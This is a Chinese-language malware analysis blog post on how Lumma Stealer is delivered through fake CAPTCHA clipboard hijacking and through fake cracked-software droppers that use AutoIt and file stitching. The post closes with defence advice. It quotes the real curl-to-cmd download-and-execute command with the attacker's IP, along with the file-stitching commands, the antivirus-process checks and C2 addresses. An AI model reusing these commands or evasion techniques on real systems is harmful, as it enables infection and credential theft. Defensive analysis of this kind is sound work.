---
title: Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进
description: ''
pubDate: 2026-01-25
lastModDate: ''
ogImage: true
toc: true
share: true
giscus: true
search: true
---
## 前言

Lumma Stealer（又名 LummaC2）是目前市场上最活跃的恶意软件即服务（MaaS）之一，其核心代码虽然保持稳定，但其投递（Delivery）和加载（Loading）机制却在不断进化。

通过对近期捕获的样本进行分析，我们观察到 Lumma 的攻击手法呈现出两种截然不同的流派：

1. **社会工程学流派**：利用“虚假人机验证”和 PowerShell 剪贴板劫持，绕过浏览器下载保护。
2. **复杂加载器流派**：伪装成破解软件，利用 AutoIt 和文件拼接技术（File Stitching）进行深度混淆，甚至利用 `.mpg` 或 `.cda` 等多媒体文件后缀隐藏恶意代码。

同时，Lumma Stealer属于典型的 **Trojan-Spy（间谍木马）** 家族。其核心特征在于“伪装”与“窃密”，而不像蠕虫那样通过网络自我复制，也不像勒索软件那样旨在破坏文件。

1. **Trojan（木马伪装性）**：通过社会工程学手段（如虚假验证码）或伪装成合法软件（如游戏破解补丁）进入受害者系统。
2. **Spy（间谍窃密性）**：驻留内存，通过 API Hooking 和内存扫描窃取浏览器凭证、加密货币钱包等敏感信息。

本文将结合具体捕获的样本，对 Lumma 目前主流的两种攻击链流派进行深入解构。

## 类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持

这一类型的攻击不再依赖传统的“诱导下载并运行 EXE”，而是利用用户对“人机验证”的惯性思维，诱导用户通过系统自带工具（PowerShell）主动拉取病毒。

### 1. 入口：虚假的“Verify You Are Human”

攻击者入侵合法网站并注入恶意脚本（ `#KongTuke` 脚本）。当用户访问受损页面时，会弹出一个极其逼真的伪造 CAPTCHA 页面。

- **欺骗逻辑**：页面提示用户通过图形验证，实则是一个覆盖全屏的 iframe。

- **操作诱导**：页面指示用户执行特定的“验证步骤”：

  1. 按下 `Win + R`（打开运行窗口）。
  2. 按下 `Ctrl + V`（粘贴）。
  3. 按下 `Enter`（执行）。

  ![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221705206.jpeg)


### 2. 载荷：剪贴板中的恶意代码

用户按下 `Ctrl + V` 时，粘贴的并非验证码，而是一段被脚本写入剪贴板的 PowerShell 命令：

```
cmd.exe /c start /min cmd /k "curl -s [http://85.209.129.105:2020/19](http://85.209.129.105:2020/19) | cmd && exit"
```

这段代码直接调用 `curl` 从远程服务器拉取第二阶段的 Payload 并在内存中执行，完全绕过了浏览器的文件下载扫描。

![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221709166.jpeg)

### 3. 执行链分析

根据样本分析，PowerShell 脚本执行后会释放一个压缩包到 `%AppData%\Roaming` 下（例如名为 `FINAL` 的文件夹），其中包含核心组件：

- **Python 环境**：一个微型的 Python 运行时。
- **加载器 (`test.py` / `test.pyw`)**：负责解密和加载 Shellcode。
- **加密载荷 (`data.bin`)**：真正的 Lumma Shellcode。

![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221711789.jpeg)

**代码逻辑分析 (`test.pyw`)：** 加载器使用 Python 的 `ctypes` 库直接调用 Windows API。

1. **读取**：打开 `data.bin` 并读取加密数据。
2. **解密**：使用简单的 XOR 算法（如 `key = 0x3B`）在内存中还原 Shellcode。
3. **注入**：调用 `kernel32.VirtualAlloc` 申请可执行内存（`0x40` PAGE_EXECUTE_READWRITE），使用 `RtlMoveMemory` (ctypes.memmove) 写入 Shellcode，最后通过 `ctypes.CFUNCTYPE` 创建函数指针并执行。

![image-20260124222940132](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221716267.png)

## 类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析

第二类样本通常伪装成热门游戏或软件的破解补丁（如“PA25...Setup.zip”）。虽然由于样本捕获时 C2 已失活导致无法复现网络交互，但通过分析其遗留的**安装脚本**和**中间文件**，我们可以完整复盘其精妙的“多阶段加载”逻辑。

![Screenshot showing multiple browser tabs open with various download links from websites, including Mega and DepositFiles, illustrating the path for the initial file from online to the victim machine.](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221718170.jpeg)

### 1. 初始执行：伪装的 Setup.exe

用户运行 `Setup.exe` 后，该程序实际上是一个 Dropper，它会在 `%TEMP%` 目录下释放大量文件名看似随机或具有误导性的文件。

![A screenshot of a computer interface showing the extraction process of a file named "SETUP.zip" into the "Downloads" folder. The folder contents are visible. An information window displays details such as file size and extraction time, and an arrow points to extracted files labeled "INSTALL LUMMA STEALER."](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221720657.jpeg)

### 2. 混淆核心：指鹿为马的文件扩展名

这是该样本最显著的特征。攻击者利用 Windows 默认隐藏已知文件扩展名的特性，将恶意脚本伪装成多媒体文件：

- **`Enclosed.mpg`**：这并非视频文件，而是一个**混淆的批处理脚本（Batch Script）**。
- **`Dept.pif`**：实际上是合法的 **AutoIt3.exe** 解释器。
- **`.cda` 文件（如 `Motorcycle.cda`）**：这并非 CD 音轨，而是被分割的二进制数据块或脚本片段。

![image-20260124225640333](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221726008.png)

### 3. 攻击链复盘（基于残留日志）

#### 第一阶段：环境侦察与反杀箱

Dropper 调用 `cmd.exe` 将 `Enclosed.mpg` 作为输入流执行：

```
cmd.exe /c cmd < Enclosed.mpg
```

解析出的脚本首先进行环境检查：

- **进程扫描**：使用 `tasklist | findstr` 搜索常见的安全软件进程（如 `SophosHealth`, `bdservicehost` (BitDefender), `AvastUI`, `ekrn` (ESET)）。
- **逻辑判断**：如果发现上述进程，脚本可能会静默退出或改变行为；若未发现，则继续设定变量 `Set CJykOoMQV=AutoIt3.exe`。

#### 第二阶段：文件拼接

这是对抗静态扫描的关键步骤。恶意载荷并未作为一个完整文件存在，而是被切碎隐藏。脚本使用 `copy /b` 命令将多个分散的文件重新组装：

```
copy /b /y 162936\Dept.pif + Crack + Disabilities + ... + Serbia 162936\Dept.pif
```

或者将多个 `.cda` 文件合并：

```
copy /b /y ..\Canada.cda + ..\Snowboard.cda + ... + ..\Qc.cda D
```

**分析结论**：攻击者将一个大的恶意二进制文件（可能是最终的 AutoIt 脚本 `.a3x` 或加密的 Payload）切割成名为 `Crack`, `Wallet`, `Love` 等看似无害的小文件。只有在运行时，它们才会被拼凑成完整的武器。

#### 第三阶段：白利用加载

最终，脚本会执行以下命令：

```
Dept.pif N
```

其中 `Dept.pif` 是重命名后的 AutoIt3 解释器（白名单程序），而 `N`（或 `N.a3x`）是刚刚拼接好的恶意脚本。利用 AutoIt 执行恶意代码可以有效绕过部分基于特征码的查杀。

![image-20260124225700727](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221225948036.png)

### 4. 最终意图：Lumma 引导 SectopRAT

根据关联情报（IOC），该样本不仅释放 Lumma Stealer 窃取数据，还会作为下载器拉取 **SectopRAT (ArechClient2)**。

- **持久化**：在启动文件夹创建 `NanoCraft.url`，指向 `%LocalAppData%` 下的恶意脚本，实现开机自启。
- **C2 通信**：尽管 C2 失活，但日志显示它曾试图连接 `5.10.250.239:9000`（SectopRAT 的典型端口）以及多个 `.ru` 结尾的域名（Lumma 的典型 C2）。

![Screenshot of a Wireshark application displaying network traffic data filtered to show interaction from a RAT (Remote Access Trojan) installer, with columns for timestamp, handshake type, host names, and other data, highlighting malicious activities. Text indicates the Lumma Stealer C2 traffic, the request for SECTOP RAT installer and the SECTOP RAT C2 traffic. ](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221730399.png)

![Screenshot of a Windows computer screen showing the process of creating a persistent SECTOP RAT on an infected host, with files named AutoIt3.exe being highlighted and details displayed in various open windows.](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221225909641.jpeg)

## 总结与防御

通过对这两类样本的分析，我们可以归纳出 Lumma Stealer 的演进逻辑：

1. **入口多样化**：从传统的“诱导下载”向“社会工程学劫持（剪贴板）”转变，攻击者的手段更加隐蔽且互动性更强。
2. **对抗静态分析**：类型二样本展示了极高的对抗水平，通过**文件碎片化拼接**和**扩展名伪装**（`.mpg`, `.cda`），使得单纯的文件扫描很难在早期发现完整的恶意 Payload。
3. **工具链滥用**：无论是 PowerShell、Python 还是 AutoIt，攻击者都在滥用合法的解释器来执行恶意逻辑（Living off the Land），这给基于行为的防御带来了挑战。

**防御建议：**

- **警惕剪贴板操作**：任何网页提示需要“Win+R”并粘贴内容的，100% 为恶意攻击。
- **显示文件扩展名**：在 Windows 设置中开启“显示已知文件类型的扩展名”，可以轻易识破 `.mpg` 实际是 `.bat` 或 `.cmd` 的伪装。